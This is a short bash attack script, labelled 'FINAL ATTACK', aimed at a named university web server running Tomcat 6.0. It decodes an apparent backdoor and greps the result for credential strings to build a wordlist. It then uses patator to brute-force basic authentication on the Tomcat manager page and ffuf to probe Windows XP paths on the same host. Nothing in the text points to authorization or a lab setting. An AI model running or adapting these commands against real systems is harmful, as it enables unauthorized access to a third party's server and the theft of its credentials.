#!/bin/bash
echo "[+] FINAL ATTACK - Tomcat 6.0 + Backdoor Analysis"

# 1. Deep backdoor decoding
echo "[+] Deep backdoor analysis..."
node deep_decode.js > backdoor_decoded.txt

# 2. Extract potential credentials from backdoor
grep -i -E "password|user|pass|pwd|login|auth" backdoor_decoded.txt > extracted_creds.txt

# 3. Create custom wordlist from decoded data
cat extracted_creds.txt | grep -oE "[A-Za-z0-9@._-]{4,20}" | sort -u > extracted_words.txt

# 4. Intensive brute force with extracted words
echo "[+] Intensive brute force..."
patator http_fuzz url=https://sito.utslp.edu.mx/manager/html auth_type=basic user_pass=FILE0:FILE1 0=extracted_words.txt 1=extracted_words.txt -t 1 -x ignore:code=401

# 5. Test Windows XP specific paths
echo "[+] Testing Windows XP paths..."
ffuf -u "https://sito.utslp.edu.mx/FUZZ" -w windows_paths.txt -mc 200 -o windows_scan.txt

echo "[+] FINAL ATTACK COMPLETED"
